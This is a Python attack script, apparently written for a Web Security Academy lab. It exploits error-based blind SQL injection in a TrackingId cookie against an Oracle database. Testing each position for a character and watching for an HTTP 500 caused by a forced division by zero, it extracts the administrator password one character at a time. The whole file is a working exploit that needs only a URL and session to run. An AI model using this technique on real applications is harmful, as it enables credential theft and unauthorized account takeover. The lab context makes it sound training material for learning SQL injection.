#!/usr/bin/env python3
from pwn import *
import requests
import signal
import sys
import string
import time
from termcolor import colored

# Manejador para salir limpiamente con Ctrl+C
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Configuración del ataque
# Los caracteres que probaremos: letras minúsculas y números
characters = string.ascii_lowercase + string.digits
url = "https://0a5c000504a13a58809508d700a200a2.web-security-academy.net"
target_user = 'administrator'

p1 = log.progress("SQLI")
p1.status("Iniciando ataque de fuerza bruta")
time.sleep(2)

password = ""
p2 = log.progress("Password")

def makeSQLI():
    global password
    # Iteramos por la posición del carácter (asumiendo hasta 20 caracteres)
    for position in range(1, 21):
        for character in characters:
            # Payload de Blind SQLi con Error Condicional (Oracle)
            # Si el carácter es correcto, fuerza una división por cero TO_CHAR(1/0) provocando un Error 500
            sqli_payload = f"f\"opTM4Ic5M3tdYiBB'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='{target_user}')||'"
            
            cookies = {
                "TrackingId": sqli_payload,
                "session": "eeBjOf3YK4uowytrMt8WtFXH7U4Gc0Vo" # Asegurate de actualizar esta sesión antes del vivo
            }

            p1.status(f"Probando posición {position} con carácter: {character}")
            
            try:
                r = requests.get(url, cookies=cookies)
                
                # Si el servidor responde con 500 Internal Server Error, confirmamos el carácter
                if r.status_code == 500:
                    password += character
                    p2.status(password)
                    break
                    
            except requests.exceptions.RequestException as e:
                log.error(f"Error en la petición: {e}")
                continue

if __name__ == '__main__':
    try:
        makeSQLI()
        print(colored(f"\n[+] Password exfiltrado con éxito: {password}", 'green'))
    except Exception as e:
        log.error(f"Error durante la ejecución: {e}")